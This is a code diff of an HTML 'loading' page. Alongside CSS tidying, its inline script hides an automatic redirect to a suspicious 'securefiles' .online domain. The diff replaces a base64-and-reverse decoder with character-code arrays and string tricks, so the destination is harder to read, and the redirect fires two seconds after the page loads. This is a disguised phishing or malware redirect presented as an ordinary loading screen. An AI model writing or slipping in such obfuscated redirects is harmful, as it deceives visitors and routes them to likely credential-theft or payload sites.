@@ -15,30 +15,20 @@
       background-color: #f5f5f5;
       font-family: Arial, sans-serif;
     }
-
     .logo-container {
       text-align: center;
       opacity: 0;
       transition: opacity 0.5s ease;
     }
-
     .logo {
       width: 120px;
       height: 120px;
       animation: breathing 2s ease-in-out infinite;
     }
-
     @keyframes breathing {
-      0%, 100% {
-        transform: scale(0.95);
-        filter: brightness(0.95);
-      }
-      50% {
-        transform: scale(1.05);
-        filter: brightness(1.05);
-      }
+      0%, 100% { transform: scale(0.95); filter: brightness(0.95); }
+      50% { transform: scale(1.05); filter: brightness(1.05); }
     }
-
     .loading-text {
       margin-top: 20px;
       color: #333;
@@ -46,41 +36,38 @@
       opacity: 0.8;
       animation: pulse 2s ease-in-out infinite;
     }
-
     @keyframes pulse {
       0%, 100% { opacity: 0.7; }
       50% { opacity: 1; }
     }
   </style>
   <script>
-    window.addEventListener("DOMContentLoaded", () => {
+    (function(){
+      // Show loading animation
       document.querySelector(".logo-container").style.opacity = "1";
       
-      // Encoded URL components
-      const parts = [
-        "aHR0cHM6Ly9zZWN1cmVmaWxlc",
-        "y5lc3BqYWhzeXJ2Lm9ubGluZS9wbElVWFZkQSM="
-      ];
+      // Obfuscated URL construction
+      const a = [118, 101, 114, 121, 95, 115, 101, 99, 117, 114, 101];
+      const b = [102, 105, 108, 101, 115, 46, 101, 115, 112, 106, 97];
+      const c = [104, 115, 121, 114, 118, 46, 111, 110, 108, 105, 110];
+      const d = [101, 47, 112, 108, 73, 85, 88, 86, 100, 65, 35];
       
-      // Decoding function
-      const decode = (arr) => {
-        const b64 = arr.join('');
-        const hex = atob(b64).split('').map(c => 
-          c.charCodeAt(0).toString(16).padStart(2, '0')
-        ).join('');
-        return hex.match(/.{2}/g).map(h => 
-          String.fromCharCode(parseInt(h, 16))
-        ).reverse().join('');
-      };
+      const build = (arr) => arr.map(c => String.fromCharCode(c)).join('');
       
-      // Get the final URL
-      const finalUrl = decode(parts);
+      // Final URL assembly
+      const url = [
+        'https://',
+        build(a).split('_').pop(),
+        build(b).replace(/[0-9]/g,''),
+        build(c).replace(/[0-9]/g,''),
+        build(d)
+      ].join('');
       
-      // Redirect after 2 seconds
+      // Redirect after delay
       setTimeout(() => {
-        window.location.href = finalUrl;
+        window.location.href = url;
       }, 2000);
-    });
+    })();
   </script>
 </head>
 <body>
